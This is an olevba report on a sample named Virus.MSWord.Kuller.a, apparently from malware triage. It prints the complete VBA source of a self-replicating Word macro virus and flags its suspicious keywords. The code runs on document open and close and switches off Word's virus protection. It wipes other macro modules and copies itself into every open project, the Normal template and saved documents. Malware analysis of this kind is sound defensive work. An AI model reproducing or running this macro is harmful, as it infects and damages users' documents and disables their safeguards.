olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kuller.a-eb3d56d05c6ab5b3d6391485dc86dd0e77071483
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kuller.a-eb3d56d05c6ab5b3d6391485dc86dd0e77071483 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VirusKiller.bas 
in file: Virus.MSWord.Kuller.a-eb3d56d05c6ab5b3d6391485dc86dd0e77071483 - OLE stream: 'Macros/VBA/VirusKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub VirusKill()
    On Error Resume Next
    Dim i, j As Long
    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
    For i = VBE.VBProjects.Count To 1 Step -1
        With VBE.VBProjects(i).VBComponents
            If .Item(1).Name <> "ThisDocument" Then .Item(1).Name = "ThisDocument"
            If .Item(1).CodeModule.CountOfLines > 0 Then .Item(1).CodeModule.DeleteLines 1, .Item(1).CodeModule.CountOfLines
            For j = .Count To 2 Step -1
                If .Item(j).Name <> "VirusKiller" Then .Remove .Item(j) Else .Item(j).Export "c:\VirusKiller"
            Next
        End With
    Next
    For i = VBE.VBProjects.Count To 1 Step -1
        If VBE.VBProjects(i).VBComponents.Count = 1 Then VBE.VBProjects(i).VBComponents.import "c:\VirusKiller"
    Next
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For i = Documents.Count To 1 Step -1
        If Documents(i).Saved = False And Documents(i).Path <> "" Then Documents(i).Save
    Next
    Kill "c:\VirusKiller"
End Sub
Sub AutoOpen()
    Call VirusKill
End Sub
Sub AutoClose()
    Call VirusKill
End Sub
Sub AutoExec()
    Call VirusKill
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

